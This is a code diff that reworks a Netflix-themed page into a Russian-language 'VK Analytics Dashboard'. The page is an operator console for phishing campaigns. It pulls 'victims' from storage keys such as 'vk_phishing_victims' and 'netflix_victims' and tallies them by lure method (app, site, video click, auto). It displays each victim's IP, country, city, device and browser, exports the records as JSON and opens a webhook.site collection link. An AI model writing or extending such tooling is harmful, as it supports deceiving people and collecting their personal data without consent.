@@ -1,25 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Analytics Dashboard</title>
+    <title>VK Analytics Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: #0a0a0a; 
+            background: #0f0f0f; 
             color: #fff; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             overflow-x: hidden;
         }
         
         .dashboard {
             min-height: 100vh;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
         }
         
         .header {
-            background: rgba(229, 9, 20, 0.1);
+            background: rgba(74, 118, 168, 0.1);
             backdrop-filter: blur(10px);
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             padding: 1rem 2rem;
@@ -29,7 +29,7 @@
         }
         
         .logo { 
-            color: #e50914; 
+            color: #4a76a8; 
             font-size: 1.8rem; 
             font-weight: bold; 
         }
@@ -47,18 +47,18 @@
             border-radius: 12px;
             padding: 1.5rem;
             text-align: center;
-            transition: transform 0.3s ease;
+            transition: all 0.3s ease;
         }
         
         .stat-card:hover {
             transform: translateY(-5px);
-            background: rgba(255, 255, 255, 0.08);
+            border-color: #4a76a8;
         }
         
         .stat-number {
             font-size: 2.5rem;
             font-weight: bold;
-            color: #e50914;
+            color: #4a76a8;
             margin-bottom: 0.5rem;
         }
         
@@ -67,11 +67,51 @@
             font-size: 0.9rem;
         }
         
+        .controls {
+            display: flex;
+            gap: 1rem;
+            margin: 1rem 2rem;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            background: rgba(74, 118, 168, 0.2);
+            color: white;
+            border: 1px solid rgba(74, 118, 168, 0.3);
+            padding: 0.7rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .btn:hover {
+            background: rgba(74, 118, 168, 0.3);
+        }
+        
+        .btn.danger {
+            background: rgba(220, 53, 69, 0.2);
+            border-color: rgba(220, 53, 69, 0.3);
+        }
+        
+        .btn.danger:hover {
+            background: rgba(220, 53, 69, 0.3);
+        }
+        
         .main-content {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 2rem;
             padding: 0 2rem 2rem;
+        }
+        
+        @media (max-width: 1200px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
         }
         
         .section {
@@ -82,7 +122,7 @@
         }
         
         .section-title {
-            color: #e50914;
+            color: #4a76a8;
             margin-bottom: 1rem;
             font-size: 1.2rem;
             display: flex;
@@ -91,7 +131,7 @@
         }
         
         .victims-list {
-            max-height: 400px;
+            max-height: 500px;
             overflow-y: auto;
         }
         
@@ -102,28 +142,43 @@
             padding: 1rem;
             margin-bottom: 0.5rem;
             transition: all 0.3s ease;
+            cursor: pointer;
         }
         
         .victim-card:hover {
             background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(229, 9, 20, 0.3);
+            border-color: rgba(74, 118, 168, 0.3);
+        }
+        
+        .victim-card.active {
+            background: rgba(74, 118, 168, 0.1);
+            border-color: #4a76a8;
         }
         
         .victim-header {
             display: flex;
-            justify-content: between;
+            justify-content: space-between;
             align-items: center;
             margin-bottom: 0.5rem;
         }
         
         .victim-id {
             font-weight: bold;
-            color: #e50914;
+            color: #4a76a8;
+        }
+        
+        .victim-method {
+            background: #4a76a8;
+            color: white;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
         }
         
         .victim-time {
             color: #666;
             font-size: 0.8rem;
+            margin-bottom: 0.5rem;
         }
         
         .victim-info {
@@ -139,77 +194,22 @@
             gap: 0.3rem;
         }
         
-        .map-container {
-            height: 300px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #666;
-            margin-top: 1rem;
-        }
-        
-        .controls {
-            display: flex;
-            gap: 1rem;
-            margin-bottom: 1rem;
-        }
-        
-        .btn {
-            background: rgba(229, 9, 20, 0.2);
-            color: white;
-            border: 1px solid rgba(229, 9, 20, 0.3);
-            padding: 0.5rem 1rem;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .btn:hover {
-            background: rgba(229, 9, 20, 0.3);
-        }
-        
-        .device-chart {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-        
-        .chart-item {
-            background: rgba(255, 255, 255, 0.03);
-            padding: 1rem;
-            border-radius: 8px;
-            text-align: center;
-        }
-        
-        .chart-value {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #e50914;
-        }
-        
-        .chart-label {
-            color: #ccc;
-            font-size: 0.8rem;
-        }
-        
         .data-table {
             width: 100%;
             border-collapse: collapse;
             margin-top: 1rem;
+            font-size: 0.9rem;
         }
         
         .data-table th,
         .data-table td {
-            padding: 0.5rem;
+            padding: 0.7rem;
             text-align: left;
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .data-table th {
-            color: #e50914;
+            color: #4a76a8;
             font-weight: 600;
         }
         
@@ -218,257 +218,559 @@
             border: 1px solid #333;
             border-radius: 8px;
             padding: 1rem;
-            max-height: 300px;
+            max-height: 500px;
             overflow-y: auto;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             font-size: 0.8rem;
+            white-space: pre-wrap;
+            line-height: 1.4;
+        }
+        
+        .filter-section {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .filter-btn {
+            padding: 0.5rem 1rem;
+            border: 1px solid #4a76a8;
+            border-radius: 6px;
+            background: transparent;
+            color: #4a76a8;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s ease;
+        }
+        
+        .filter-btn.active {
+            background: #4a76a8;
+            color: white;
+        }
+        
+        .method-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .method-stat {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .method-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #4a76a8;
+        }
+        
+        .method-label {
+            color: #ccc;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+        
+        .empty-state {
+            text-align: center;
+            color: #666;
+            padding: 2rem;
+            font-style: italic;
+        }
+        
+        .last-update {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="dashboard">
         <div class="header">
-            <div class="logo">🎯 Netflix Analytics</div>
+            <div class="logo">📊 VK Analytics Dashboard</div>
             <div class="controls">
-                <button class="btn" onclick="loadData()">🔄 Refresh</button>
-                <button class="btn" onclick="exportData()">📤 Export</button>
-                <button class="btn" onclick="clearData()">🗑️ Clear</button>
+                <button class="btn" onclick="loadAllData()">
+                    <span>🔄</span> Обновить данные
+                </button>
+                <button class="btn" onclick="exportAllData()">
+                    <span>📤</span> Экспорт JSON
+                </button>
+                <button class="btn" onclick="openWebhook()">
+                    <span>🌐</span> Webhook панель
+                </button>
+                <button class="btn danger" onclick="clearAllData()">
+                    <span>🗑️</span> Очистить все
+                </button>
             </div>
         </div>
         
         <div class="stats-overview">
             <div class="stat-card">
                 <div class="stat-number" id="totalVictims">0</div>
-                <div class="stat-label">Total Victims</div>
+                <div class="stat-label">Всего жертв</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="activeToday">0</div>
-                <div class="stat-label">Active Today</div>
+                <div class="stat-number" id="todayVictims">0</div>
+                <div class="stat-label">Сегодня</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="locationsCount">0</div>
-                <div class="stat-label">Locations</div>
+                <div class="stat-number" id="uniqueCountries">0</div>
+                <div class="stat-label">Страны</div>
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="dataPoints">0</div>
-                <div class="stat-label">Data Points</div>
+                <div class="stat-label">Точек данных</div>
+            </div>
+        </div>
+        
+        <div class="filter-section">
+            <button class="filter-btn active" onclick="setFilter('all')">Все методы</button>
+            <button class="filter-btn" onclick="setFilter('app')">📱 Приложение</button>
+            <button class="filter-btn" onclick="setFilter('site')">🌐 Сайт</button>
+            <button class="filter-btn" onclick="setFilter('click')">🎥 Клик по видео</button>
+            <button class="filter-btn" onclick="setFilter('auto')">🤖 Авто</button>
+        </div>
+        
+        <div class="method-stats">
+            <div class="method-stat">
+                <div class="method-value" id="appCount">0</div>
+                <div class="method-label">Приложение</div>
+            </div>
+            <div class="method-stat">
+                <div class="method-value" id="siteCount">0</div>
+                <div class="method-label">Сайт</div>
+            </div>
+            <div class="method-stat">
+                <div class="method-value" id="autoCount">0</div>
+                <div class="method-label">Авто</div>
             </div>
         </div>
         
         <div class="main-content">
             <div class="section">
-                <div class="section-title">👥 Recent Victims</div>
+                <div class="section-title">👥 Последние жертвы</div>
                 <div class="victims-list" id="victimsList">
-                    <!-- Victims will be loaded here -->
+                    <div class="empty-state">Загрузка данных...</div>
                 </div>
+                <div class="last-update" id="lastUpdate"></div>
             </div>
             
             <div class="section">
-                <div class="section-title">🌍 Location Data</div>
-                <div class="map-container" id="mapContainer">
-                    Location visualization will appear here
-                </div>
+                <div class="section-title">🌍 Геолокация</div>
                 <div id="locationStats">
-                    <!-- Location stats will be loaded here -->
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Страна</th>
+                                <th>Город</th>
+                                <th>Жертвы</th>
+                            </tr>
+                        </thead>
+                        <tbody id="locationTable">
+                            <tr><td colspan="3" style="text-align: center; color: #666;">Нет данных о локациях</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
             
             <div class="section">
-                <div class="section-title">📱 Device Information</div>
-                <div class="device-chart">
-                    <div class="chart-item">
-                        <div class="chart-value" id="desktopCount">0</div>
-                        <div class="chart-label">Desktop</div>
-                    </div>
-                    <div class="chart-item">
-                        <div class="chart-value" id="mobileCount">0</div>
-                        <div class="chart-label">Mobile</div>
-                    </div>
-                    <div class="chart-item">
-                        <div class="chart-value" id="tabletCount">0</div>
-                        <div class="chart-label">Tablet</div>
-                    </div>
-                    <div class="chart-item">
-                        <div class="chart-value" id="otherDevices">0</div>
-                        <div class="chart-label">Other</div>
-                    </div>
+                <div class="section-title">📱 Устройства и браузеры</div>
+                <div id="deviceStats">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Платформа</th>
+                                <th>Браузер</th>
+                                <th>Кол-во</th>
+                            </tr>
+                        </thead>
+                        <tbody id="deviceTable">
+                            <tr><td colspan="3" style="text-align: center; color: #666;">Нет данных об устройствах</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
             
             <div class="section">
-                <div class="section-title">🔍 Detailed Data</div>
+                <div class="section-title">🔍 Детальные данные</div>
                 <div class="json-viewer" id="jsonViewer">
-                    Select a victim to view detailed data
+                    Выберите жертву из списка слева для просмотра детальной информации
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        let victimsData = [];
+        let allVictims = [];
+        let currentFilter = 'all';
+        let selectedVictim = null;
         
-        function loadData() {
-            try {
-                victimsData = JSON.parse(localStorage.getItem('netflix_victims') || '[]');
-                updateDashboard();
-            } catch (error) {
-                console.error('Error loading data:', error);
+        // Ключи хранилища
+        const STORAGE_KEYS = [
+            'vk_phishing_victims',  // Новый VK фишинг
+            'vk_victims',           // Старый VK
+            'netflix_victims',      // Netflix
+            'advanced_victims',     // Старые данные
+            'stealth_victims'       // Стелс данные
+        ];
+
+        function loadAllData() {
+            allVictims = [];
+            
+            // Загружаем данные из всех хранилищ
+            STORAGE_KEYS.forEach(key => {
+                try {
+                    const data = JSON.parse(localStorage.getItem(key) || '[]');
+                    if (data && data.length > 0) {
+                        console.log(`Найдено ${data.length} записей в ${key}`);
+                        
+                        // Добавляем источник к данным
+                        const dataWithSource = data.map(item => {
+                            // Определяем тип кампании
+                            let campaign = 'other';
+                            if (key.includes('vk')) campaign = 'vk';
+                            if (key.includes('netflix')) campaign = 'netflix';
+                            
+                            return {
+                                ...item,
+                                storageKey: key,
+                                campaign: campaign,
+                                displaySource: getDisplaySource(item, key)
+                            };
+                        });
+                        
+                        allVictims = [...allVictims, ...dataWithSource];
+                    }
+                } catch (error) {
+                    console.error(`Ошибка загрузки ${key}:`, error);
+                }
+            });
+            
+            // Сортируем по времени (новые сверху)
+            allVictims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            updateDashboard();
+            updateLastUpdateTime();
+        }
+        
+        function getDisplaySource(victim, storageKey) {
+            // Для нового VK фишинга
+            if (storageKey === 'vk_phishing_victims') {
+                const method = victim.interaction?.method || victim.session?.method || 'unknown';
+                const methodLabels = {
+                    'app': '📱 Приложение',
+                    'site': '🌐 Сайт', 
+                    'click': '🎥 Клик',
+                    'auto': '🤖 Авто',
+                    'unknown': '❓ Неизвестно'
+                };
+                return methodLabels[method] || methodLabels.unknown;
             }
+            
+            // Для других источников
+            if (storageKey.includes('vk')) return 'VK';
+            if (storageKey.includes('netflix')) return 'Netflix';
+            return 'Другое';
+        }
+        
+        function setFilter(filter) {
+            currentFilter = filter;
+            
+            // Обновляем активные кнопки
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            updateDashboard();
+        }
+        
+        function getFilteredVictims() {
+            if (currentFilter === 'all') return allVictims;
+            
+            return allVictims.filter(victim => {
+                const method = victim.interaction?.method || victim.session?.method || '';
+                return method === currentFilter;
+            });
         }
         
         function updateDashboard() {
-            // Update overview stats
-            document.getElementById('totalVictims').textContent = victimsData.length;
-            document.getElementById('activeToday').textContent = getTodayCount();
-            document.getElementById('locationsCount').textContent = getUniqueLocations();
-            document.getElementById('dataPoints').textContent = getTotalDataPoints();
+            const victims = getFilteredVictims();
+            const allTimeVictims = allVictims;
             
-            // Update victims list
-            updateVictimsList();
+            // Общая статистика
+            document.getElementById('totalVictims').textContent = allTimeVictims.length;
+            document.getElementById('todayVictims').textContent = getTodayCount(allTimeVictims);
+            document.getElementById('uniqueCountries').textContent = getUniqueCountries(allTimeVictims);
+            document.getElementById('dataPoints').textContent = getTotalDataPoints(allTimeVictims);
             
-            // Update device stats
-            updateDeviceStats();
+            // Статистика по методам
+            updateMethodStats(allTimeVictims);
             
-            // Update location stats
-            updateLocationStats();
+            // Список жертв
+            updateVictimsList(victims);
+            
+            // Геоданные
+            updateLocationStats(allTimeVictims);
+            
+            // Устройства
+            updateDeviceStats(allTimeVictims);
         }
         
-        function getTodayCount() {
-            const today = new Date().toDateString();
-            return victimsData.filter(v => 
-                new Date(v.timestamp).toDateString() === today
-            ).length;
-        }
-        
-        function getUniqueLocations() {
-            const locations = new Set();
-            victimsData.forEach(v => {
-                if (v.data?.location?.country) {
-                    locations.add(v.data.location.country);
-                }
+        function updateMethodStats(victims) {
+            const methods = {
+                'app': 0,
+                'site': 0, 
+                'click': 0,
+                'auto': 0,
+                'unknown': 0
+            };
+            
+            victims.forEach(victim => {
+                const method = victim.interaction?.method || victim.session?.method || 'unknown';
+                methods[method] = (methods[method] || 0) + 1;
             });
-            return locations.size;
-        }
-        
-        function getTotalDataPoints() {
-            return victimsData.reduce((total, victim) => {
-                return total + Object.keys(victim.data || {}).length * 10;
-            }, 0);
-        }
-        
-        function updateVictimsList() {
-            const list = document.getElementById('victimsList');
-            list.innerHTML = '';
             
-            if (victimsData.length === 0) {
-                list.innerHTML = '<div class="victim-card">No data collected yet</div>';
+            document.getElementById('appCount').textContent = methods.app;
+            document.getElementById('siteCount').textContent = methods.site;
+            document.getElementById('autoCount').textContent = methods.auto;
+        }
+        
+        function updateVictimsList(victims) {
+            const list = document.getElementById('victimsList');
+            
+            if (victims.length === 0) {
+                list.innerHTML = '<div class="empty-state">Нет данных для выбранного фильтра</div>';
                 return;
             }
             
-            victimsData.slice(-10).reverse().forEach((victim, index) => {
+            list.innerHTML = '';
+            
+            victims.slice(0, 15).forEach((victim, index) => {
                 const card = document.createElement('div');
-                card.className = 'victim-card';
-                card.onclick = () => showVictimDetails(victim);
+                card.className = 'victim-card' + (victim === selectedVictim ? ' active' : '');
+                card.onclick = () => selectVictim(victim);
                 
-                const device = victim.data?.device;
-                const location = victim.data?.location;
+                const device = victim.device || {};
+                const location = victim.location || {};
+                const session = victim.session || {};
                 
                 card.innerHTML = `
                     <div class="victim-header">
-                        <span class="victim-id">Victim #${victimsData.length - index}</span>
-                        <span class="victim-time">${formatTime(victim.timestamp)}</span>
+                        <span class="victim-id">#${index + 1}</span>
+                        <span class="victim-method">${victim.displaySource}</span>
                     </div>
+                    <div class="victim-time">${formatDateTime(victim.timestamp)}</div>
                     <div class="victim-info">
-                        <div class="info-item">📱 ${device?.platform || 'Unknown'}</div>
-                        <div class="info-item">🌐 ${device?.browser?.vendor || 'Unknown'}</div>
-                        <div class="info-item">📍 ${location?.country || 'Unknown'}</div>
-                        <div class="info-item">🕒 ${device?.timezone || 'Unknown'}</div>
+                        <div class="info-item">📱 ${getPlatformName(device.platform)}</div>
+                        <div class="info-item">🌐 ${getBrowserName(device.userAgent)}</div>
+                        <div class="info-item">📍 ${location.country || 'Неизвестно'}</div>
+                        <div class="info-item">🕒 ${device.timezone || 'Неизвестно'}</div>
                     </div>
+                    ${location.ip ? `<div style="font-size: 0.7rem; color: #666; margin-top: 0.5rem;">IP: ${location.ip}</div>` : ''}
                 `;
                 
                 list.appendChild(card);
             });
         }
         
-        function updateDeviceStats() {
-            const devices = {
-                desktop: 0,
-                mobile: 0,
-                tablet: 0,
-                other: 0
-            };
+        function selectVictim(victim) {
+            selectedVictim = victim;
             
-            victimsData.forEach(victim => {
-                const platform = victim.data?.device?.platform?.toLowerCase() || '';
-                if (platform.includes('win') || platform.includes('mac') || platform.includes('linux')) {
-                    devices.desktop++;
-                } else if (platform.includes('mobile') || platform.includes('android') || platform.includes('iphone')) {
-                    devices.mobile++;
-                } else if (platform.includes('tablet') || platform.includes('ipad')) {
-                    devices.tablet++;
-                } else {
-                    devices.other++;
-                }
+            // Обновляем выделение
+            document.querySelectorAll('.victim-card').forEach(card => {
+                card.classList.remove('active');
             });
+            event.currentTarget.classList.add('active');
             
-            document.getElementById('desktopCount').textContent = devices.desktop;
-            document.getElementById('mobileCount').textContent = devices.mobile;
-            document.getElementById('tabletCount').textContent = devices.tablet;
-            document.getElementById('otherDevices').textContent = devices.other;
-        }
-        
-        function updateLocationStats() {
-            const locationStats = document.getElementById('locationStats');
-            const countries = {};
-            
-            victimsData.forEach(victim => {
-                const country = victim.data?.location?.country;
-                if (country) {
-                    countries[country] = (countries[country] || 0) + 1;
-                }
-            });
-            
-            let html = '<table class="data-table"><tr><th>Country</th><th>Victims</th></tr>';
-            Object.entries(countries).forEach(([country, count]) => {
-                html += `<tr><td>${country}</td><td>${count}</td></tr>`;
-            });
-            html += '</table>';
-            
-            locationStats.innerHTML = html;
+            // Показываем детальные данные
+            showVictimDetails(victim);
         }
         
         function showVictimDetails(victim) {
-            document.getElementById('jsonViewer').textContent = 
-                JSON.stringify(victim, null, 2);
+            const viewer = document.getElementById('jsonViewer');
+            
+            // Форматируем JSON для лучшей читаемости
+            const formattedData = JSON.stringify(victim, null, 2);
+            viewer.textContent = formattedData;
         }
         
-        function exportData() {
-            const dataStr = JSON.stringify(victimsData, null, 2);
+        function updateLocationStats(victims) {
+            const table = document.getElementById('locationTable');
+            const locations = {};
+            
+            victims.forEach(victim => {
+                const location = victim.location;
+                if (location && location.country) {
+                    const key = `${location.country}-${location.city || 'Unknown'}`;
+                    if (!locations[key]) {
+                        locations[key] = {
+                            country: location.country,
+                            city: location.city || 'Неизвестно',
+                            count: 0,
+                            ip: location.ip
+                        };
+                    }
+                    locations[key].count++;
+                }
+            });
+            
+            let html = '';
+            Object.values(locations)
+                .sort((a, b) => b.count - a.count)
+                .slice(0, 8)
+                .forEach(location => {
+                    html += `
+                        <tr>
+                            <td>${location.country}</td>
+                            <td>${location.city}</td>
+                            <td>${location.count}</td>
+                        </tr>
+                    `;
+                });
+            
+            table.innerHTML = html || '<tr><td colspan="3" style="text-align: center; color: #666;">Нет данных о локациях</td></tr>';
+        }
+        
+        function updateDeviceStats(victims) {
+            const table = document.getElementById('deviceTable');
+            const platforms = {};
+            
+            victims.forEach(victim => {
+                const device = victim.device;
+                if (device) {
+                    const platform = getPlatformName(device.platform);
+                    const browser = getBrowserName(device.userAgent);
+                    const key = `${platform}-${browser}`;
+                    
+                    if (!platforms[key]) {
+                        platforms[key] = {
+                            platform: platform,
+                            browser: browser,
+                            count: 0
+                        };
+                    }
+                    platforms[key].count++;
+                }
+            });
+            
+            let html = '';
+            Object.values(platforms)
+                .sort((a, b) => b.count - a.count)
+                .slice(0, 8)
+                .forEach(item => {
+                    html += `
+                        <tr>
+                            <td>${item.platform}</td>
+                            <td>${item.browser}</td>
+                            <td>${item.count}</td>
+                        </tr>
+                    `;
+                });
+            
+            table.innerHTML = html || '<tr><td colspan="3" style="text-align: center; color: #666;">Нет данных об устройствах</td></tr>';
+        }
+        
+        function getPlatformName(platform) {
+            if (!platform) return 'Неизвестно';
+            platform = platform.toLowerCase();
+            
+            if (platform.includes('win')) return 'Windows';
+            if (platform.includes('mac')) return 'MacOS';
+            if (platform.includes('linux')) return 'Linux';
+            if (platform.includes('android')) return 'Android';
+            if (platform.includes('iphone') || platform.includes('ipad')) return 'iOS';
+            return platform;
+        }
+        
+        function getBrowserName(userAgent) {
+            if (!userAgent) return 'Неизвестно';
+            
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            if (userAgent.includes('Opera')) return 'Opera';
+            return 'Другой';
+        }
+        
+        function getTodayCount(victims) {
+            const today = new Date().toDateString();
+            return victims.filter(v => 
+                new Date(v.timestamp).toDateString() === today
+            ).length;
+        }
+        
+        function getUniqueCountries(victims) {
+            const countries = new Set();
+            victims.forEach(v => {
+                if (v.location?.country) {
+                    countries.add(v.location.country);
+                }
+            });
+            return countries.size;
+        }
+        
+        function getTotalDataPoints(victims) {
+            return victims.reduce((total, victim) => {
+                return total + (Object.keys(victim).length * 3); // Примерный расчет
+            }, 0);
+        }
+        
+        function formatDateTime(timestamp) {
+            const date = new Date(timestamp);
+            return date.toLocaleString('ru-RU', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+        
+        function updateLastUpdateTime() {
+            document.getElementById('lastUpdate').textContent = 
+                `Последнее обновление: ${new Date().toLocaleString('ru-RU')}`;
+        }
+        
+        function exportAllData() {
+            const dataStr = JSON.stringify(allVictims, null, 2);
             const blob = new Blob([dataStr], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
             link.href = url;
-            link.download = `netflix_victims_${new Date().toISOString().split('T')[0]}.json`;
+            link.download = `vk_analytics_${new Date().toISOString().split('T')[0]}.json`;
             link.click();
             URL.revokeObjectURL(url);
         }
         
-        function clearData() {
-            if (confirm('Are you sure you want to delete all data?')) {
-                localStorage.removeItem('netflix_victims');
-                loadData();
+        function openWebhook() {
+            window.open('https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b', '_blank');
+        }
+        
+        function clearAllData() {
+            if (confirm('ВНИМАНИЕ! Это удалит ВСЕ данные из ВСЕХ кампаний. Продолжить?')) {
+                STORAGE_KEYS.forEach(key => {
+                    localStorage.removeItem(key);
+                });
+                allVictims = [];
+                selectedVictim = null;
+                updateDashboard();
             }
         }
         
-        function formatTime(timestamp) {
-            return new Date(timestamp).toLocaleTimeString();
-        }
+        // Автообновление каждые 15 секунд
+        setInterval(loadAllData, 15000);
         
-        // Auto-refresh every 10 seconds
-        setInterval(loadData, 10000);
+        // Первая загрузка при открытии
+        document.addEventListener('DOMContentLoaded', loadAllData);
         
-        // Initial load
-        loadData();
     </script>
 </body>
 </html>
